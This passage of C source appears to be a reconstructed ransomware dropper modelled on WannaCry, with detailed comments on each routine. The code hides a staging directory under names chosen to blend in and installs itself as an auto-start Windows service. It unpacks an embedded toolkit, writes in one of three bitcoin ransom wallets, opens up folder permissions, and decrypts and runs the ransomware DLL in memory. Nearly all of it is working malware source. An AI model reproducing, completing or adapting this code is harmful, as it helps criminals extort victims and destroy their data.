// hidden + system. (The outPath parameter is never used — all callers here
// pass NULL.)
// ---------------------------------------------------------------------------
static int MakeWorkDir(LPCWSTR base, LPCWSTR sub, wchar_t *out)
{
    CreateDirectoryW(base, NULL);
    if (!SetCurrentDirectoryW(base)) return 0;
    CreateDirectoryW(sub, NULL);
    if (!SetCurrentDirectoryW(sub)) return 0;
    DWORD a = GetFileAttributesW(sub);
    SetFileAttributesW(sub, a | 6 /*HIDDEN|SYSTEM*/);               // make the payload dir stealthy
    if (out != NULL) swprintf(out, FMT_DIR_SUB, base);
    return 1;
}

// ---------------------------------------------------------------------------
// SelectWorkdir — choose where to stage the payload, leaving CWD inside the
// hidden random subdirectory. Priority order:
//   1. <windir>\ProgramData — only usable if that directory already exists
//   2. <windir>\Intel       — created on the spot (blends in with real Intel dirs)
//   3. <windir> itself
//   4. %TEMP% (trailing '\' stripped)
// ---------------------------------------------------------------------------
static BOOL SelectWorkdir(wchar_t *outPath /*unused here, passed 0*/)
{
    wchar_t base[260], sub[260], windir[260];
    memset(sub, 0, sizeof(sub));
    MultiByteToWideChar(CP_ACP, 0, g_randName, -1, sub, 99);        // subdir = random install tag
    GetWindowsDirectoryW(windir, 0x104);
    swprintf(base, FMT_PROGRAMDATA, windir);
    if (GetFileAttributesW(base) != INVALID_FILE_ATTRIBUTES &&      // ProgramData only if it already exists
        MakeWorkDir(base, sub, outPath))
        return TRUE;
    swprintf(base, FMT_INTEL, windir);
    if (MakeWorkDir(base, sub, outPath)) return TRUE;
    if (MakeWorkDir(windir, sub, outPath)) return TRUE;
    GetTempPathW(0x104, base);
    wchar_t *p = wcsrchr(base, L'\\');
    if (p != NULL) { p = wcsrchr(base, L'\\'); *p = L'\0'; }        // strip the trailing backslash
    return MakeWorkDir(base, sub, outPath) ? TRUE : FALSE;
}

// ---------------------------------------------------------------------------
// ServiceInstall — register the dropper copy (tasksche.exe) as a
// SERVICE_AUTO_START Windows service named with the random per-machine tag
// (g_randName); its ImagePath wraps the exe in `cmd.exe /c "..."`. If the
// service already exists (prior infection), just start it.
// NOTE: the service name is the RANDOM name — "mssecsvc2.0" belongs to the
// worm component, not this dropper.
// ---------------------------------------------------------------------------
static int ServiceInstall(LPCSTR fullPath)
{
    char path[1024];
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, 0xF003F);            // SC_MANAGER_ALL_ACCESS
    if (scm == NULL) return 0;
    int ok = 0;
    SC_HANDLE svc = OpenServiceA(scm, g_randName, 0xF01FF);         // already installed?
    if (svc == NULL) {
        sprintf(path, FMT_SVC_PATH, fullPath);
        svc = CreateServiceA(scm, g_randName, g_randName, 0xF01FF,
                             SERVICE_WIN32_OWN_PROCESS /*0x10*/,
                             SERVICE_AUTO_START      /*0x2*/,       // survives reboot
                             SERVICE_ERROR_NORMAL    /*0x1*/,
                             path, NULL, NULL, NULL, NULL, NULL);
        if (svc != NULL) {
            StartServiceA(svc, 0, NULL);
            CloseServiceHandle(svc);
            ok = 1;
        }
    } else {
        StartServiceA(svc, 0, NULL);                                // service exists: start it
        CloseServiceHandle(svc);
        ok = 1;
    }
    CloseServiceHandle(scm);
    return ok;
}

// ---------------------------------------------------------------------------
// WaitForMutex — poll once per second for "Global\MsWinZonesCacheCounterMutexA0"
// (a decoy-looking name the payload creates once it's running). Seeing the
// mutex confirms the launch worked; this is a success handshake, NOT a
// single-instance guard.
// ---------------------------------------------------------------------------
static int WaitForMutex(int seconds)
{
    char name[100];
    sprintf(name, FMT_MUTEX, S_MUTEX, 0);
    for (int i = 0; i < seconds; i++) {
        HANDLE m = OpenMutexA(SYNCHRONIZE /*0x100000*/, TRUE, name);
        if (m != NULL) { CloseHandle(m); return 1; }                // payload is up
        Sleep(1000);
    }
    return 0;
}

// ---------------------------------------------------------------------------
// InstallAndLaunch — resolve the full path of tasksche.exe in the workdir,
// install + start it as a service and wait for the payload mutex. If the
// service route fails, launch tasksche.exe directly and wait again.
// ---------------------------------------------------------------------------
static int InstallAndLaunch(void)
{
    char full[0x208];
    GetFullPathNameA(S_TASKSCHE, 0x208, full, NULL);
    if (ServiceInstall(full) != 0 && WaitForMutex(0x3C) != 0)       // 60 s for the service path
        return 1;
    if (CreateProcessAndWait(full, 0, NULL) != 0 &&
        WaitForMutex(0x3C) != 0)                                    // fallback: run directly
        return 1;
    return 0;
}

// ---------------------------------------------------------------------------
// ExtractResource — pull the embedded zip toolkit out of the executable's
// resources (resource #2058, type "XIA"), open it as an in-memory archive
// with the password, and extract every entry except a c.wnry that already
// exists (preserving the victim's config).
// ---------------------------------------------------------------------------
static int ExtractResource(HMODULE module, LPCSTR password)
{
    HRSRC r = FindResourceA(module, (LPCSTR)0x80A /*2058*/, RES_TYPE_XIA);
    if (r == NULL) return 0;
    HGLOBAL res = LoadResource(module, r);
    if (res == NULL) return 0;
    LPVOID data = LockResource(res);
    if (data == NULL) return 0;
    DWORD size = SizeofResource(module, r);
    void *z = UnzOpen_Mem(data, size, password);
    if (z == NULL) return 0;
    // one info record doubles as {entry count; char name[296]} — the
    // first call (-1) fills the entry count, later calls fill the name
    struct { DWORD count; char name[296]; } info;
    info.count = 0;
    UnzGetFileInfo(z, -1, (char *)&info);
    for (unsigned i = 0; i < info.count; i++) {
        UnzGetFileInfo(z, i, (char *)&info);
        if (strcmp(info.name, S_CWNRY) != 0 ||                      // skip existing c.wnry
            GetFileAttributesA(info.name) == INVALID_FILE_ATTRIBUTES)// ...unless it isn't there yet
            UnzExtractFile(z, i, info.name);
    }
    UnzClose(z);
    return 1;
}

// ---------------------------------------------------------------------------
// SetRandomBtcAddr — read the 0x30C-byte c.wnry and overwrite the bitcoin
// address slot at offset 178 (0xB2) with one of the three hardcoded wallets
// picked by rand()%3. This rand() call continues the computer-name-seeded
// sequence, so the wallet choice is deterministic per machine.
// ---------------------------------------------------------------------------
static void SetRandomBtcAddr(void)
{
    BYTE cfg[178]; char addrSlot[602];                              // = 0x30C total
    const char *addrs[3] = { BTC_ADDRS[0], BTC_ADDRS[1], BTC_ADDRS[2] };
    if (ReadWriteConfig(cfg, 1 /*read*/)) {
        strcpy(addrSlot, addrs[rand() % 3]);
        ReadWriteConfig(cfg, 0 /*write*/);
    }
}

// ---------------------------------------------------------------------------
// MemLoad_DLL — wrapper that hands the loader the real API callbacks
// (VirtualAlloc/VirtualFree/LoadLibraryA/GetProcAddress/FreeLibrary).
// ---------------------------------------------------------------------------
static HMODULE MemLoad_DLL(BYTE *dll, DWORD size)
{
    return MemLoad_DLL_Core(dll, size,
        (void *)VirtualAlloc, (void *)VirtualFree,
        (void *)LoadLibraryA, (void *)GetProcAddress,
        (void *)FreeLibrary, NULL);
}

// ---------------------------------------------------------------------------
// WinMain — the dropper's real main (the CRT startup calls this).
// Two roles in one binary:
//   /i (install): pick a workdir, copy self to tasksche.exe there, register
//                 + start it as a service, wait for the payload mutex.
//   otherwise (run): stage the toolkit (extract zip, randomize BTC address,
//                 hide + open the workdir), then decrypt t.wnry in-memory
//                 and call the payload DLL's TaskStart export. This is the
//                 path the service's tasksche.exe execution lands in too.
// ---------------------------------------------------------------------------
int WINAPI WinMainCrt(HINSTANCE hInstance, HINSTANCE hPrev,
                      LPSTR lpCmdLine, int nCmdShow)
{
    (void)hPrev; (void)lpCmdLine; (void)nCmdShow;
    char selfPath[0x208];
    selfPath[0] = '\0';
    GetModuleFileNameA(NULL, selfPath, 0x208);
    GenRandomName(g_randName);            /* derive the per-machine install tag */

    // ---- install path: only with argv[1] == "/i" ----
    if (__argc == 2 && strcmp(__argv[1], ARG_INSTALL) == 0 &&
        SelectWorkdir(NULL)) {
        CopyFileA(selfPath, S_TASKSCHE, FALSE);                     // drop tasksche.exe in the workdir
        if (GetFileAttributesA(S_TASKSCHE) != INVALID_FILE_ATTRIBUTES &&
            InstallAndLaunch())
            return 0;                 /* payload running elsewhere; done */
    }

    // ---- payload path (service start of tasksche.exe lands here too) ----
    char *slash = strrchr(selfPath, '\\');
    if (slash != NULL) *slash = '\0';
    SetCurrentDirectoryA(selfPath);                                 // workdir = our own directory
    RegistrySetWorkdir(1 /*write*/);                                // remember it under the registry key
    ExtractResource(NULL /*own module*/, ZIP_PASSWORD);             // unpack the toolkit zip
    SetRandomBtcAddr();                                             // pick this victim's wallet
    CreateProcessAndWait(CMD_ATTRIB, 0, NULL);                      // hide the workdir
    CreateProcessAndWait(CMD_ICACLS, 0, NULL);                      // make it world-writable

    if (ResolveKernel32W()) {          /* also resolves the advapi32 Crypt* set internally */
        CryptoContainer *c = Container_Ctor();
        if (c != NULL && Container_Init(c, 0, 0, 0)) {              /* embedded-key mode */
            UINT payloadSize = 0;
            BYTE *dll = Container_ReadTwnry(c, S_TWNRY, &payloadSize); // decrypt the payload in memory
            if (dll != NULL) {
                HMODULE mod = MemLoad_DLL(dll, payloadSize);        // map it without touching disk
                if (mod != NULL) {
                    void (WINAPI *TaskStart)(int, int) =
                        (void (WINAPI *)(int, int))(DWORD_PTR)
                        MemGetProcAddress(mod, S_TASKSTART);
                    if (TaskStart != NULL)
                        TaskStart(0, 0);   /* the ransomware now runs in-process */
                }
            }
        }
        Container_Dtor(c);              /* wipe keys and staging buffers */
    }
    return 0;
}

// ---------------------------------------------------------------------------
// CRT entry — boilerplate MSVC GUI startup, summarized: SEH frame, CRT init
// (_set_app_type, fmode/commode, math/FPU setup, _initterm, __getmainargs),
// command-line parsing and GetStartupInfoA, then exit(WinMainCrt(...)).
// Followed by the usual statically-linked CRT helper stubs and the SEH
// unwinds guarding the container constructors/destructors.
// ---------------------------------------------------------------------------
